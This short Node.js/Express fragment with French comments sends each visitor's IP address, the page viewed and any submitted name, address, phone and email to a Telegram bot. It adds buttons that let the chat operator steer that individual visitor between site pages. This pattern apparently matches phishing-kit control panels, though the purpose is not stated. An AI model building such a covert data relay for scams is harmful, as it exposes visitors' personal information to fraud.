// Fonction pour envoyer notification Telegram
async function sendTelegramMessage(text, keyboard = null) {
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text,
      parse_mode: "HTML",
      reply_markup: keyboard,
    }),
  });
}

// Route pour notification visite ou formulaire
app.post("/visit", async (req, res) => {
  const { visitorId, page, formData } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  let message = `👤 <b>Utilisateur ID:</b> ${visitorId}\n🌍 <b>IP:</b> ${ip}\n📄 <b>Page:</b> ${page}`;

  // Si formulaire rempli, ajouter infos avec emojis
  if (formData) {
    message += `\n\n🏠 <b>Adresse:</b> ${formData.adresse || "-"}`
             + `\n📞 <b>Téléphone:</b> ${formData.telephone || "-"}`
             + `\n👤 <b>Nom:</b> ${formData.nom || "-"}`
             + `\n📧 <b>Email:</b> ${formData.email || "-"}`;
  }

  // Clavier inline pour rediriger l'utilisateur
  const keyboard = {
    inline_keyboard: [[
      { text: "🏠 Accueil", callback_data: `index_${visitorId}` },
      { text: "ℹ️ Info", callback_data: `info_${visitorId}` },
      { text: "📞 Contact", callback_data: `contact_${visitorId}` },
      { text: "👀 Visite", callback_data: `visite_${visitorId}` }
    ]]
  };

  await sendTelegramMessage(message, keyboard);
  res.json({ success: true });
});
